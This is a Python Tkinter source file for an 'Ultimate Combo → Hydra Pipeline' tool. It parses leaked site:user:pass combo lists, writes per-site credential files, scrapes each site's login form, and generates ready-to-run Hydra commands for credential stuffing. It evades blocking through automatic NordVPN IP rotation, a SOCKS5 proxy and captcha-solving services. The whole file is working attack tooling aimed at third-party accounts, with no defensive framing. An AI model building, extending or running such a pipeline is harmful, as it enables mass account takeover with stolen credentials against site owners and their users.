import csv
import json
import os
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import tkinter as tk
from tkinter import filedialog, messagebox, ttk

from config import GOST_EXE, config, download_gost, save_config
from extract import extract_login_form
from helpers import COMMON_LOGIN_PATHS, get_base_url, get_site_filename, normalize_site, split_three_fields
from runner import RunnerMixin


class CombinedParserGUI(RunnerMixin):
    def __init__(self, root):
        self.root = root
        self.root.title("Ultimate Combo → Hydra Pipeline")
        self.root.geometry("1450x980")

        self.input_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.forms_output_path = tk.StringVar()
        self.status_text = tk.StringVar(value="Ready.")
        self.header1 = tk.StringVar(value="site")
        self.header2 = tk.StringVar(value="user")
        self.header3 = tk.StringVar(value="pass")
        self.create_combo = tk.BooleanVar(value=True)
        self.extract_forms = tk.BooleanVar(value=True)
        self.skip_blank = tk.BooleanVar(value=True)
        self.trim_whitespace = tk.BooleanVar(value=True)
        self.use_proxy = tk.BooleanVar(value=True)
        self.proxy_url = tk.StringVar(value="socks5://127.0.0.1:1080")
        self.tld_only = tk.BooleanVar(value=True)
        self.threads = tk.IntVar(value=6)
        self.strict_validation = tk.BooleanVar(value=True)
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.gost_process = None

        self.processed_file = Path("processed_sites.json")
        self.processed_data = self.load_processed_data()

        self.runner_tree = None
        self.hydra_log = None
        self.processing_thread = None
        self.notebook = None
        self.settings_window = None

        self._build_ui()
        self.root.after(500, self.refresh_runner_list)  # slight delay to ensure widgets are ready

    def load_processed_data(self):
        if self.processed_file.exists():
            try:
                return json.loads(self.processed_file.read_text(encoding='utf-8'))
            except:
                return {}
        return {}

    def save_processed_data(self):
        self.processed_file.write_text(json.dumps(self.processed_data, indent=2), encoding='utf-8')

    def _write_log_threadsafe(self, text):
        self.root.after(0, lambda: self.log.insert(tk.END, text + "\n") or self.log.see(tk.END))

    def _update_status_threadsafe(self, text):
        self.root.after(0, lambda: self.status_text.set(text))

    def _update_progress_threadsafe(self, mode=None, maximum=None, value=None, stop=False):
        def update():
            if mode is not None: self.progress["mode"] = mode
            if maximum is not None: self.progress["maximum"] = maximum
            if value is not None: self.progress["value"] = value
            if stop: self.progress.stop()
        self.root.after(0, update)

    def _show_progress_threadsafe(self, show):
        self.root.after(0, lambda: self.progress.pack(fill="x", pady=8) if show else self.progress.pack_forget())

    def _build_ui(self):
        notebook = ttk.Notebook(self.root)
        self.notebook = notebook
        notebook.pack(fill="both", expand=True)
    
        extractor_tab = ttk.Frame(notebook)
        notebook.add(extractor_tab, text="Extractor")
    
        runner_tab = ttk.Frame(notebook)
        notebook.add(runner_tab, text="Hydra Runner")
    
        self.build_extractor_tab(extractor_tab)
        self.build_runner_tab(runner_tab)
    
        # Auto-refresh runner list when switching to Hydra Runner tab
        def on_tab_changed(event):
            selected_tab = notebook.select()
            # Runner tab is the second tab (index 1)
            if selected_tab == notebook.tabs()[1]:
                try:
                    self.refresh_runner_list()
                except AttributeError:
                    # Safety: if runner_tree not ready yet, skip silently
                    pass
    
        notebook.bind("<<NotebookTabChanged>>", on_tab_changed)
        
    def build_extractor_tab(self, tab):
        main = ttk.Frame(tab, padding=12)
        main.pack(fill="both", expand=True)

        ttk.Label(main, text="Combo Parser + Advanced Form Extractor", font=("Segoe UI", 14, "bold")).pack(anchor="w", pady=(0, 8))

        io_grid = ttk.Frame(main)
        io_grid.pack(fill="x", pady=6)

        inp_f = ttk.LabelFrame(io_grid, text="Input (file or folder)", padding=10)
        inp_f.grid(row=0, column=0, sticky="nsew", padx=10)
        ttk.Entry(inp_f, textvariable=self.input_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(inp_f, text="File", command=self.choose_input_file).pack(side="left", padx=4)
        ttk.Button(inp_f, text="Folder", command=self.choose_input_folder).pack(side="left")

        out_f = ttk.LabelFrame(io_grid, text="Main CSV Output", padding=10)
        out_f.grid(row=0, column=1, sticky="nsew", padx=10)
        ttk.Entry(out_f, textvariable=self.output_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(out_f, text="Save As", command=self.choose_output_file).pack(side="left")

        forms_f = ttk.LabelFrame(io_grid, text="Hydra Forms CSV", padding=10)
        forms_f.grid(row=0, column=2, sticky="nsew", padx=10)
        ttk.Entry(forms_f, textvariable=self.forms_output_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(forms_f, text="Save As", command=self.choose_forms_output_file).pack(side="left")

        mid_grid = ttk.Frame(main)
        mid_grid.pack(fill="x", pady=6)

        head_f = ttk.LabelFrame(mid_grid, text="CSV Headers", padding=10)
        head_f.grid(row=0, column=0, sticky="nsew", padx=10)
        for i, txt, var in zip(range(3), ["Column 1 (site)", "Column 2 (user)", "Column 3 (pass)"], [self.header1, self.header2, self.header3]):
            ttk.Label(head_f, text=txt).grid(row=i, column=0, sticky="w", padx=6, pady=4)
            ttk.Entry(head_f, textvariable=var, width=40).grid(row=i, column=1, sticky="ew", pady=4)
        head_f.columnconfigure(1, weight=1)

        opt_f = ttk.LabelFrame(mid_grid, text="Options", padding=10)
        opt_f.grid(row=0, column=1, sticky="nsew", padx=10)
        ttk.Checkbutton(opt_f, text="Skip blank lines", variable=self.skip_blank).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Trim whitespace", variable=self.trim_whitespace).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Create user:pass combo.txt per site", variable=self.create_combo).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Extract login forms", variable=self.extract_forms).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Strict form validation", variable=self.strict_validation).pack(anchor="w", pady=4)

        proxy_f = ttk.LabelFrame(mid_grid, text="Proxy / VPN (NordVPN Auto)", padding=10)
        proxy_f.grid(row=0, column=2, sticky="nsew", padx=10)
        ttk.Checkbutton(proxy_f, text="Enable NordVPN Auto-Proxy + Rotation", variable=self.use_proxy).pack(anchor="w")
        ttk.Label(proxy_f, text="NordVPN token set in Settings").pack(anchor="w")

        thread_f = ttk.LabelFrame(main, text="Extraction Speed", padding=10)
        thread_f.pack(fill="x", pady=6)
        ttk.Label(thread_f, text="Threads (4-8 recommended):").pack(anchor="w")
        ttk.Scale(thread_f, from_=1, to=12, orient="horizontal", variable=self.threads, 
                  length=400, command=lambda v: self.threads.set(int(round(float(v))))).pack(fill="x", padx=8)
        ttk.Label(thread_f, textvariable=self.threads).pack(anchor="e")

        btn_f = ttk.Frame(main)
        btn_f.pack(fill="x", pady=12)
        self.start_button = ttk.Button(btn_f, text="Start Pipeline", command=self.start_pipeline)
        self.start_button.pack(side="left", padx=8)
        self.pause_button = ttk.Button(btn_f, text="Pause", command=self.toggle_pause, state="disabled")
        self.pause_button.pack(side="left", padx=8)
        self.cancel_button = ttk.Button(btn_f, text="Cancel", command=self.cancel_pipeline, state="disabled")
        self.cancel_button.pack(side="left", padx=8)
        self.retry_button = ttk.Button(btn_f, text="Retry Failed", command=self.retry_failed)
        self.retry_button.pack(side="left", padx=8)
        ttk.Button(btn_f, text="Settings", command=self.open_settings).pack(side="left", padx=8)
        ttk.Button(btn_f, text="Clear Log", command=self.clear_log).pack(side="left", padx=8)

        ttk.Label(main, textvariable=self.status_text, foreground="#0066cc").pack(anchor="w", pady=6)

        self.progress = ttk.Progressbar(main, orient="horizontal", length=960, mode="determinate")
        self.progress.pack(fill="x", pady=6)
        self.progress.pack_forget()

        log_f = ttk.LabelFrame(main, text="Log", padding=8)
        log_f.pack(fill="both", expand=True)
        self.log = tk.Text(log_f, height=22, wrap="word")
        self.log.pack(side="left", fill="both", expand=True)
        sc = ttk.Scrollbar(log_f, orient="vertical", command=self.log.yview)
        sc.pack(side="right", fill="y")
        self.log.configure(yscrollcommand=sc.set)

    def open_settings(self):
        settings_window = tk.Toplevel(self.root)
        self.settings_window = settings_window
        settings_window.title("Settings")
        settings_window.geometry("500x400")

        ttk.Label(settings_window, text="DeathByCaptcha Username").pack(pady=5)
        self.dbc_user = tk.StringVar(value=config.get("dbc_user", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_user).pack(pady=5)

        ttk.Label(settings_window, text="DeathByCaptcha Password").pack(pady=5)
        self.dbc_pass = tk.StringVar(value=config.get("dbc_pass", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_pass, show="*").pack(pady=5)

        ttk.Label(settings_window, text="NordVPN Token").pack(pady=5)
        self.nord_token = tk.StringVar(value=config.get("nord_token", ""))
        ttk.Entry(settings_window, textvariable=self.nord_token).pack(pady=5)

        ttk.Label(settings_window, text="2Captcha API Key (optional)").pack(pady=5)
        self.twocaptcha_key = tk.StringVar(value=config.get("twocaptcha_key", ""))
        ttk.Entry(settings_window, textvariable=self.twocaptcha_key).pack(pady=5)

        ttk.Label(settings_window, text="Burp Proxy (optional, e.g. http://127.0.0.1:8080)").pack(pady=5)
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))
        ttk.Entry(settings_window, textvariable=self.burp_proxy).pack(pady=5, fill="x", padx=16)

        ttk.Button(settings_window, text="Save & Close", command=self.save_settings).pack(pady=20)

    def save_settings(self):
        config['dbc_user'] = self.dbc_user.get()
        config['dbc_pass'] = self.dbc_pass.get()
        config['nord_token'] = self.nord_token.get()
        config['twocaptcha_key'] = self.twocaptcha_key.get()
        config['burp_proxy'] = self.burp_proxy.get().strip()
        save_config()
        messagebox.showinfo("Settings", "Settings saved.")
        if self.settings_window and self.settings_window.winfo_exists():
            self.settings_window.destroy()

    def setup_nordvpn_proxy(self):
        try:
            if not config.get('nord_token'):
                self._write_log_threadsafe("No NordVPN token set - using no proxy")
                return None

            self._write_log_threadsafe("Setting up NordVPN + SOCKS5 proxy...")

            subprocess.run(["nordvpn", "login", "--token", config['nord_token']], capture_output=True)
            subprocess.run(["nordvpn", "connect"], capture_output=True)

            download_gost()

            self.gost_process = subprocess.Popen([str(GOST_EXE), "-L=socks5://:1080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)

            self._write_log_threadsafe("NordVPN SOCKS5 proxy active on 127.0.0.1:1080")
            return {"server": "socks5://127.0.0.1:1080"}

        except Exception as e:
            self._write_log_threadsafe(f"NordVPN / gost setup failed: {e}. Falling back to no proxy.")
            return None

    def rotate_nordvpn(self):
        try:
            subprocess.run(["nordvpn", "disconnect"], capture_output=True)
            subprocess.run(["nordvpn", "connect"], capture_output=True)
            self._write_log_threadsafe("Rotated NordVPN IP")
        except Exception as e:
            self._write_log_threadsafe(f"IP rotation failed: {e}")

    def choose_input_file(self):
        fp = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if fp:
            self.input_path.set(fp)
            if not self.output_path.get():
                self.output_path.set(str(Path(fp).with_suffix(".csv")))
            self._write_log_threadsafe(f"Input file: {fp}")

    def choose_input_folder(self):
        d = filedialog.askdirectory()
        if d:
            self.input_path.set(d)
            if not self.output_path.get():
                self.output_path.set(str(Path(d) / "combined.csv"))
            self._write_log_threadsafe(f"Input folder: {d}")

    def choose_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.output_path.set(fp)
            self._write_log_threadsafe(f"Output CSV: {fp}")

    def choose_forms_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.forms_output_path.set(fp)
            self._write_log_threadsafe(f"Forms CSV: {fp}")

    def clear_log(self):
        self.log.delete("1.0", tk.END)

    def start_pipeline(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Running...")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(False,))
        self.processing_thread.start()

    def retry_failed(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Retrying failed sites...")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(True,))
        self.processing_thread.start()

    def toggle_pause(self):
        if not self.pipeline_running:
            return

        self.pipeline_paused = not self.pipeline_paused
        if self.pipeline_paused:
            self.pause_button.config(text="Resume")
            self.status_text.set("Paused")
        else:
            self.pause_button.config(text="Pause")
            self.status_text.set("Running...")

    def cancel_pipeline(self):
        if not self.pipeline_running:
            return

        self.pipeline_cancelled = True
        self.pipeline_paused = False
        self.status_text.set("Cancelling...")

        self.root.after(500, self.check_thread_done)

    def check_thread_done(self):
        if self.processing_thread and self.processing_thread.is_alive():
            self.root.after(500, self.check_thread_done)
        else:
            self.cleanup_after_pipeline("Cancelled by user")

    def cleanup_after_pipeline(self, final_msg):
        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="normal")
        self.pause_button.config(state="disabled")
        self.cancel_button.config(state="disabled")
        self.retry_button.config(state="normal")
        self.status_text.set(final_msg)
        messagebox.showinfo("Pipeline Status", final_msg)

        if self.gost_process:
            self.gost_process.terminate()
            self.gost_process = None
        subprocess.run(["nordvpn", "disconnect"], capture_output=True)
        self.save_processed_data()

    def process_pipeline(self, retry_failed_only=False):
        try:
            input_str = self.input_path.get().strip()
            out_csv = self.output_path.get().strip()
            forms_csv = self.forms_output_path.get().strip()

            if not input_str or not out_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Input and main output required."))
                self.cleanup_after_pipeline("Failed - Missing input/output")
                return

            if self.extract_forms.get() and not forms_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Forms output required."))
                self.cleanup_after_pipeline("Failed - Missing forms output")
                return

            in_path = Path(input_str)
            out_path = Path(out_csv)
            forms_path = Path(forms_csv) if self.extract_forms.get() else None

            headers = [self.header1.get().strip(), self.header2.get().strip(), self.header3.get().strip()]
            if any(not h for h in headers):
                self.root.after(0, lambda: messagebox.showerror("Error", "All headers required."))
                self.cleanup_after_pipeline("Failed - Missing headers")
                return

            input_files = [in_path] if in_path.is_file() else list(in_path.glob("*.txt"))
            if not input_files:
                self.root.after(0, lambda: messagebox.showerror("Error", "No .txt files found."))
                self.cleanup_after_pipeline("Failed - No input files")
                return

            rows = []
            skipped = 0
            site_combos = {}

            self._write_log_threadsafe("Collecting data...")
            self._update_status_threadsafe("Collecting...")
            self._update_progress_threadsafe(mode="indeterminate")
            self._show_progress_threadsafe(True)

            for file in input_files:
                self._write_log_threadsafe(f"Parsing: {file.name}")
                with file.open("r", encoding="utf-8", errors="replace") as f:
                    for ln, raw in enumerate(f, 1):
                        if self.pipeline_cancelled:
                            self.cleanup_after_pipeline("Cancelled during data collection")
                            return

                        while self.pipeline_paused:
                            time.sleep(0.5)
                            if self.pipeline_cancelled:
                                self.cleanup_after_pipeline("Cancelled while paused")
                                return

                        line = raw.strip() if self.trim_whitespace.get() else raw.rstrip("\n\r")
                        if self.skip_blank.get() and not line:
                            continue
                        parts = split_three_fields(line)
                        if not parts:
                            skipped += 1
                            continue

                        rows.append(parts)
                        user, pw = parts[1], parts[2]
                        if user or pw:
                            orig_url = normalize_site(parts[0])
                            if orig_url:
                                base = get_base_url(orig_url)
                                if base:
                                    site_combos.setdefault(base, set()).add(f"{user}:{pw}")

            self._write_log_threadsafe(f"Main CSV: {len(rows)} rows | {skipped} skipped")

            out_path.parent.mkdir(parents=True, exist_ok=True)
            with out_path.open("w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(headers)
                writer.writerows(rows)
            self._write_log_threadsafe(f"Wrote combined CSV → {out_path}")

            if self.create_combo.get():
                for base, combos_set in site_combos.items():
                    combo_path = out_path.parent / get_site_filename(base)
                    existing = set()
                    if combo_path.exists():
                        with combo_path.open("r", encoding="utf-8") as f:
                            existing = set(line.strip() for line in f if line.strip())
                    new_unique = combos_set - existing
                    if new_unique:
                        with combo_path.open("a", encoding="utf-8") as f:
                            f.write("\n".join(new_unique) + "\n")
                            f.flush()
                        self._write_log_threadsafe(f"Appended {len(new_unique)} new combos to {combo_path.name}")
                    self.processed_data.setdefault(base, {})["combo_count"] = len(existing) + len(new_unique)

            self.save_processed_data()

            proxy = self.setup_nordvpn_proxy() if self.use_proxy.get() else None
            burp_server = config.get("burp_proxy", "").strip()
            if burp_server:
                proxy = {"server": burp_server}
                self._write_log_threadsafe(f"Using Burp proxy for extraction: {burp_server}")

            if self.extract_forms.get() and site_combos:
                site_list = []
                for base in site_combos:
                    if retry_failed_only:
                        if base in self.processed_data and self.processed_data[base].get('form_found', False):
                            continue
                    elif base in self.processed_data and self.processed_data[base].get('form_found', False):
                        continue
                    site_list.append(base)

                if not site_list:
                    self._write_log_threadsafe("No sites need form extraction.")
                    self.cleanup_after_pipeline("Complete - No new forms needed.")
                    return

                self._write_log_threadsafe(f"Extracting forms for {len(site_list)} sites...")
                self._update_status_threadsafe("Extracting forms...")
                self._update_progress_threadsafe(mode="determinate", maximum=len(site_list), value=0)
                self._show_progress_threadsafe(True)

                results = []
                total = len(site_list)
                rotation_counter = 0

                def extract_for_site(base):
                    nonlocal rotation_counter
                    if self.pipeline_cancelled:
                        return None

                    while self.pipeline_paused:
                        time.sleep(0.5)
                        if self.pipeline_cancelled:
                            return None

                    urls_to_try = [base]
                    if not self.tld_only.get():
                        clean_base = base.rstrip('/')
                        for path in COMMON_LOGIN_PATHS:
                            urls_to_try.append(f"{clean_base}{path}")

                    form = None
                    fail_reason = None
                    for url in urls_to_try:
                        if not url: continue
                        form_data, error = extract_login_form(url, proxy, strict_validation=self.strict_validation.get())
                        if form_data:
                            form = form_data
                            break
                        fail_reason = error or fail_reason

                    rotation_counter += 1
                    if rotation_counter % 10 == 0 or fail_reason:
                        self.rotate_nordvpn()

                    return form, fail_reason

                with ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
                    future_to_base = {executor.submit(extract_for_site, base): base for base in site_list}
                    for i, future in enumerate(as_completed(future_to_base), 1):
                        if self.pipeline_cancelled:
                            self.cleanup_after_pipeline("Cancelled during extraction")
                            return

                        while self.pipeline_paused:
                            time.sleep(0.5)
                            if self.pipeline_cancelled:
                                self.cleanup_after_pipeline("Cancelled while paused")
                                return

                        base = future_to_base[future]
                        try:
                            form, fail_reason = future.result()
                            if form:
                                form['base_url'] = base
                                form['combo_file'] = get_site_filename(base)
                                form['full_hydra_command'] = form['hydra_command_template'].replace("{{combo_file}}", get_site_filename(base))
                                results.append(form)
                                self.processed_data[base] = {
                                    'last_processed': datetime.now().isoformat(),
                                    'form_found': True,
                                    'failed_urls': [],
                                    'combo_count': self.processed_data.get(base, {}).get('combo_count', 0),
                                    'hydra_command_template': form.get('hydra_command_template', '')
                                }
                            else:
                                self.processed_data.setdefault(base, {})
                                self.processed_data[base]['last_processed'] = datetime.now().isoformat()
                                self.processed_data[base]['form_found'] = False
                                self.processed_data[base].setdefault('failed_urls', [])
                                self.processed_data[base]['failed_urls'].append({'url': base, 'reason': fail_reason or "unknown"})
                                self.processed_data[base]['combo_count'] = self.processed_data.get(base, {}).get('combo_count', 0)
                        except Exception as e:
                            print(f"Thread error for {base}: {e}")

                        self._update_progress_threadsafe(value=i)
                        self._update_status_threadsafe(f"Extracting: {i}/{total}")

                self._show_progress_threadsafe(False)

                if results:
                    keys = ['original_url', 'base_url', 'used_url', 'used_type', 'action', 'post_data',
                            'failure_condition', 'hydra_command_template', 'combo_file', 'full_hydra_command', 'confidence', 'validation_reason']
                    with forms_path.open("w", newline="", encoding="utf-8") as f:
                        writer = csv.DictWriter(f, fieldnames=keys)
                        writer.writeheader()
                        writer.writerows(results)
                    self._write_log_threadsafe(f"Found {len(results)} validated forms → {forms_path}")

                self._write_log_threadsafe("Updated processed_sites.json")
                self.save_processed_data()

            self.cleanup_after_pipeline("Pipeline complete! Check per-site files and hydra_forms.csv")

        except Exception as e:
            self.cleanup_after_pipeline(f"Pipeline failed: {str(e)}")
